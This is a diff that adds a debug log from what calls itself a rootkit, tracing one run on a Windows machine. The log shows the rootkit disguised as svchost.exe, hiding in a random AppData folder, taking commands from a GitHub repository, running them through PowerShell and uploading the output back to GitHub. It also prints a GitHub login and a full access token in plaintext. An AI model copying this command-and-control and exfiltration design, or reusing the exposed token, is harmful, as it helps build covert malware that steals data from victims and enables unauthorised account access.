@@ -1,0 +1,45 @@
+Tue Aug 24 22:25:20 2021. Initialisation of the log file.
+
+DEBUG: Tue Aug 24 22:25:20 2021: GithubLogin: hidemepls785
+DEBUG: Tue Aug 24 22:25:20 2021: GithubRepoName: furry-octo-parakeet
+DEBUG: Tue Aug 24 22:25:20 2021: GihubAccessToken: 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
+DEBUG: Tue Aug 24 22:25:20 2021: Rootkit Name: CorepPreprod2
+DEBUG: Tue Aug 24 22:25:20 2021: Rootkit Registry Key: Sensors
+DEBUG: Tue Aug 24 22:25:20 2021: Run Registry Key Name: test
+DEBUG: Tue Aug 24 22:25:20 2021: Adding the actual location of the servant: C:\Windows\SysWOW64\svchost.exe
+DEBUG: Tue Aug 24 22:25:21 2021: The folder list for random folder is not empty. Its size is: 4001
+DEBUG: Tue Aug 24 22:25:21 2021: The random path choosed for this execution is: C:\Users\sophie\AppData\Local\Microsoft\VisualStudio\16.0_ae066bf5\VTC\08905f489a4ddc73b729a3f254e60117
+DEBUG: Tue Aug 24 22:25:22 2021: Start of a new loop to get commands and treat them.
+DEBUG: Tue Aug 24 22:25:22 2021: Start of GithubCommunication::receiveInstructions
+DEBUG: Tue Aug 24 22:25:23 2021: Success to get the instance number of the current instance: rootkit_path1
+DEBUG: Tue Aug 24 22:25:23 2021: Success to check the commands with rootkit_path1
+DEBUG: Tue Aug 24 22:25:23 2021: Getting this command from the github repo: stay_alive
+DEBUG: Tue Aug 24 22:25:23 2021: Getting this command from the github repo: execute_cmd dir
+DEBUG: Tue Aug 24 22:25:23 2021: Start to treat the commands sent by the github repo.
+DEBUG: Tue Aug 24 22:25:23 2021: The command stay_alive has been receive, the rootkit will not stop its execution.
+DEBUG: Tue Aug 24 22:25:23 2021: Command received: stay_alive
+DEBUG: Tue Aug 24 22:25:23 2021: End of the function used to answer the commands. Check the file results.txt.
+DEBUG: Tue Aug 24 22:25:23 2021: #####################################################
+
+DEBUG: Tue Aug 24 22:25:23 2021: The command stay_alive has been receive, the rootkit will not stop its execution.
+DEBUG: Tue Aug 24 22:25:23 2021: Command received: execute_cmd
+DEBUG: Tue Aug 24 22:25:23 2021: The following command will be executed by powershell: dir > C:\Users\sophie\AppData\Local\Microsoft\VisualStudio\16.0_ae066bf5\VTC\08905f489a4ddc73b729a3f254e60117\target_command1.log
+DEBUG: Tue Aug 24 22:25:25 2021: Start of the method readFileWindowsApi for the file: C:\Users\sophie\AppData\Local\Microsoft\VisualStudio\16.0_ae066bf5\VTC\08905f489a4ddc73b729a3f254e60117\target_command1.log
+DEBUG: Tue Aug 24 22:25:25 2021: The file that will be read weight: 2596
+DEBUG: Tue Aug 24 22:25:25 2021: Success to read the binary file. This number of bytes have been read: 2597
+DEBUG: Tue Aug 24 22:25:25 2021: Success to delete the temporary file that store the powershell output
+DEBUG: Tue Aug 24 22:25:25 2021: Start of the method writeFileWindowsApi.
+DEBUG: Tue Aug 24 22:25:25 2021: The content size that will be written: 2597
+DEBUG: Tue Aug 24 22:25:25 2021: Success to write the content(number of bytes : 2597) in the file : C:\Users\sophie\AppData\Local\Microsoft\VisualStudio\16.0_ae066bf5\VTC\08905f489a4ddc73b729a3f254e60117\target_command1.log
+DEBUG: Tue Aug 24 22:25:25 2021: The file target_command.log exists, trying to upload it content.
+DEBUG: Tue Aug 24 22:25:25 2021: Start of the method uploadFileToGithubRepo.
+DEBUG: Tue Aug 24 22:25:25 2021: Start of the method readFileWindowsApi for the file: C:\Users\sophie\AppData\Local\Microsoft\VisualStudio\16.0_ae066bf5\VTC\08905f489a4ddc73b729a3f254e60117\target_command1.log
+DEBUG: Tue Aug 24 22:25:25 2021: The file that will be read weight: 2597
+DEBUG: Tue Aug 24 22:25:25 2021: Success to read the binary file. This number of bytes have been read: 2598
+DEBUG: Tue Aug 24 22:25:25 2021: The files C:\Users\sophie\AppData\Local\Microsoft\VisualStudio\16.0_ae066bf5\VTC\08905f489a4ddc73b729a3f254e60117\target_command1.log has been uploaded successfully in the github repo
+DEBUG: Tue Aug 24 22:25:25 2021: End of the function used to answer the commands. Check the file results.txt.
+DEBUG: Tue Aug 24 22:25:25 2021: #####################################################
+
+DEBUG: Tue Aug 24 22:25:25 2021: Start of GithubCommunication::sendResults
+DEBUG: Tue Aug 24 22:25:26 2021: The place of the rootkit has not been found on the json
+DEBUG: Tue Aug 24 22:25:26 2021: Start of GithubCommunication::sendLogs
